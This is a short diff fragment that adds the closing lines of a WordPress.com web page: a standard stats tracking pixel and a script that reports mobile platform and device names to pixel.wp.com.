+<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
+<script>
+if ( 'object' === typeof wpcom_mobile_user_agent_info ) {
+
+	wpcom_mobile_user_agent_info.init();
+	var mobileStatsQueryString = "";
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
+		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
+		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
+	
+	if( wpcom_mobile_user_agent_info.isIPad() )
+		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';
+
+	if( "" != mobileStatsQueryString ) {
+		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
+	}
+	
+}
+</script></body>
+</html>
